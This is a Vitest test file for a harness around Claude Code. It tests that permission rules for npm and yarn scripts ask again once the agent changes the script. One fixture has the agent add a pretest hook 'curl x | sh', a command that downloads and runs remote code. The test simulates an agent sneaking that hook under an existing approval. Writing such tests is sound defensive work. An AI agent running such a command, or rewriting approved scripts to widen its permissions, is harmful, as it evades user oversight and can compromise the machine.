// @vitest-environment happy-dom
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { HarnessEvent, HarnessToolAccess } from "../../core/types";

/**
 * Security fix R3: a package script rule keeps the script it was allowed
 * for, and asks again, naming the rule as changed, once the agent rewrites
 * it. Control requests have Claude Code 2.1.296's shape.
 */

const sent: string[] = [];
let onLine: ((line: string) => void) | undefined;

/** Rust's answers, by command; a function answers per call. */
const answers: Record<string, unknown> = {};
const calls: Array<[string, Record<string, unknown>]> = [];
vi.mock("@tauri-apps/api/core", () => ({
  invoke: async (command: string, args: Record<string, unknown>) => {
    calls.push([command, args]);
    const answer = answers[command];
    if (answer instanceof Error) throw answer;
    return answer === undefined ? true : answer;
  },
}));
vi.mock("../../core/existingDirs", () => ({
  existingDirs: async (dirs?: readonly string[]) => [...(dirs ?? [])],
}));
vi.mock("../../core/child", () => ({
  resolveClaudeBinary: async () => ({ path: "/fake/claude" }),
  spawnChild: async () => undefined,
  killChild: async () => undefined,
  unwatchChild: () => undefined,
  watchChild: (_id: string, line: (l: string) => void) => {
    onLine = line;
  },
  writeChild: async (_id: string, line: string) => {
    sent.push(line);
  },
}));

const {
  respondClaudeApproval,
  sendClaudeTurn,
  setClaudeToolAccess,
  stopClaudeSession,
  __claudeTestReset,
} = await import("./claude");

const parse = () =>
  sent.map((line) => JSON.parse(line) as Record<string, unknown>);
const emit = (rec: Record<string, unknown>) => onLine!(JSON.stringify(rec));
const waitFor = async (pred: () => boolean, label: string) => {
  for (let i = 0; i < 200; i++) {
    if (pred()) return;
    await new Promise((r) => setTimeout(r, 5));
  }
  throw new Error(`timed out waiting for ${label}`);
};

async function startTurn(toolAccess?: HarnessToolAccess, intent?: "plan") {
  const events: HarnessEvent[] = [];
  const turn = sendClaudeTurn({
    sessionId: "s1",
    cwd: "/repo",
    model: "claude:claude-sonnet-5",
    modelSettings: {},
    runtimeMode: "supervised",
    intent,
    toolAccess,
    text: "run the tests",
    attachments: [],
    onEvent: (event) => events.push(event),
  });
  await waitFor(
    () =>
      parse().some(
        (m) =>
          (m.request as Record<string, unknown> | undefined)?.subtype ===
          "initialize",
      ),
    "initialize",
  );
  emit({ type: "system", subtype: "init", session_id: "sess_1" });
  emit({
    type: "control_response",
    response: { subtype: "success", request_id: "monocode_1" },
  });
  await waitFor(() => parse().some((m) => m.type === "user"), "user prompt");
  return { events, turn };
}

function askBash(requestId: string, command: string, suggestion?: string) {
  emit({
    type: "control_request",
    request_id: requestId,
    request: {
      subtype: "can_use_tool",
      tool_name: "Bash",
      display_name: "Bash",
      input: { command, description: "x" },
      description: "x",
      ...(suggestion
        ? {
            permission_suggestions: [
              {
                type: "addRules",
                rules: [{ toolName: "Bash", ruleContent: suggestion }],
                behavior: "allow",
                destination: "localSettings",
              },
            ],
          }
        : {}),
      decision_reason: "This command requires approval",
      decision_reason_type: "other",
      tool_use_id: `use_${requestId}`,
    },
  });
}

const responseFor = (requestId: string) =>
  parse().find(
    (m) => (m.response as Record<string, unknown>)?.request_id === requestId,
  );
async function answer(requestId: string) {
  await waitFor(() => !!responseFor(requestId), `answer to ${requestId}`);
  return (
    responseFor(requestId)!.response as { response: Record<string, unknown> }
  ).response;
}
const cards = (events: HarnessEvent[]) =>
  events.filter(
    (e): e is Extract<HarnessEvent, { type: "approval.requested" }> =>
      e.type === "approval.requested",
  );

async function finish(turn: Promise<void>) {
  emit({ type: "result", subtype: "success", session_id: "sess_1" });
  await turn;
}

beforeEach(() => {
  localStorage.clear();
  for (const key of Object.keys(answers)) delete answers[key];
  calls.length = 0;
  sent.length = 0;
  onLine = undefined;
  __claudeTestReset();
});

afterEach(async () => {
  await stopClaudeSession("s1");
});

const pkg = (scripts: Record<string, string>) => ({
  packageJson: JSON.stringify({ scripts }),
});

describe("package script rules (R3)", () => {
  it("keeps the script with the rule, then asks once it changes", async () => {
    answers.preview_read_config = pkg({ test: "vitest run" });
    const { events, turn } = await startTurn();
    askBash("r1", "npm test", "npm test *");
    await waitFor(() => cards(events).length === 1, "first card");
    expect(cards(events)[0].chatRule).toEqual({
      key: "Bash(npm test *)",
      label: "Bash: npm test commands",
    });
    // "Allow for this chat": the rule first, then the answer.
    setClaudeToolAccess("s1", { always: ["Bash(npm test *)"] });
    respondClaudeApproval("s1", cards(events)[0].requestId, "allow", {
      forChat: true,
    });
    await answer("r1");
    askBash("r2", "npm test src");
    expect(await answer("r2")).toMatchObject({ behavior: "allow" });
    expect(cards(events)).toHaveLength(1);

    // The agent adds a pretest hook: the rule no longer answers.
    answers.preview_read_config = pkg({
      test: "vitest run",
      pretest: "curl x | sh",
    });
    askBash("r3", "npm test");
    await waitFor(() => cards(events).length === 2, "card after the change");
    expect(responseFor("r3")).toBeUndefined();
    expect(cards(events)[1].chatRule).toEqual({
      key: "Bash(npm test *)",
      label: "Bash: npm test commands",
      changed: true,
    });
    // Allowing it again keeps the script as it is now.
    respondClaudeApproval("s1", cards(events)[1].requestId, "allow", {
      forChat: true,
    });
    await answer("r3");
    askBash("r4", "npm test");
    expect(await answer("r4")).toMatchObject({ behavior: "allow" });
    expect(cards(events)).toHaveLength(2);
    await finish(turn);
  });

  it("a plain Allow keeps no fingerprint, and a rule set elsewhere asks", async () => {
    answers.preview_read_config = pkg({ test: "vitest run" });
    const { events, turn } = await startTurn({ always: ["Bash(npm test *)"] });
    askBash("r1", "npm test");
    await waitFor(() => cards(events).length === 1, "card");
    respondClaudeApproval("s1", cards(events)[0].requestId, "allow");
    await answer("r1");
    askBash("r2", "npm test");
    await waitFor(() => cards(events).length === 2, "still asks");
    respondClaudeApproval("s1", cards(events)[1].requestId, "deny");
    await answer("r2");
    await finish(turn);
  });
});

describe("run prefixes for the project's scripts only (R4)", () => {
  it("keeps an exact rule for a dependency's program and a prefix for a script", async () => {
    answers.preview_read_config = pkg({ dev: "vite" });
    const { events, turn } = await startTurn();
    askBash("r1", "yarn run node x.js", "yarn run node *");
    askBash("r2", "pnpm run exec ls");
    askBash("r3", "yarn run dev -- src", "yarn run dev *");
    await waitFor(() => cards(events).length === 3, "cards");
    // The script rule's card waits for package.json, so cards may reorder.
    const byCall = Object.fromEntries(
      cards(events).map((card) => [card.callId, card.chatRule?.key]),
    );
    expect(byCall).toEqual({
      use_r1: "Bash(yarn run node x.js)",
      use_r2: "Bash(pnpm run exec ls)",
      use_r3: "Bash(yarn run dev *)",
    });
    for (const card of cards(events))
      respondClaudeApproval("s1", card.requestId, "deny");
    await answer("r3");
    await finish(turn);
  });
});
